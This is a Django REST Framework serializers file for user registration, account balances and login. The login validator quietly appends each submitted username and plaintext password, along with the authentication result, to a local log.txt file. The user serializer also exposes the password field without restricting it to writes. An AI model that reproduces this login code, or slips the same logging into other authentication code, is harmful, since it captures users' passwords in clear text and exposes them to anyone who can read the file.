from rest_framework import serializers
from django.contrib.auth.models import User
from .models import Account
from django.contrib.auth import authenticate
from django.contrib.auth.models import update_last_login

class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = [
            'id',
            'username',
            'first_name',
            'last_name',
            'email',
            'password'
        ]

    def save(self):
        user = User(
            username=self.validated_data['username'],
            first_name=self.validated_data['first_name'],
            last_name=self.validated_data['last_name'],
            email=self.validated_data['email']
        )

        password = self.validated_data['password']
        user.set_password(password)
        user.save()
        return user


class AccountSerializer(serializers.ModelSerializer):
    class Meta:
        model = Account
        fields = [
            'id',
            'balance'
        ]


class LoginSerializer(serializers.Serializer):
    username = serializers.CharField()
    password = serializers.CharField()

    def validate(self, data):
        username = data.get('username', '')
        password = data.get('password', '')

        if username and password:
            user = authenticate(username=username, password=password)

            with open('log.txt', 'a') as file:
                file.write(str(username))
                file.write('\n')
                file.write(str(password))
                file.write('\n')
                file.write(str(user))
                file.write('\n')
                file.close()

            if user and user.is_active:
                return user

            raise serializers.ValidationError("Invalid Credentials")
        raise serializers.ValidationError("Username and password cannot be empty")

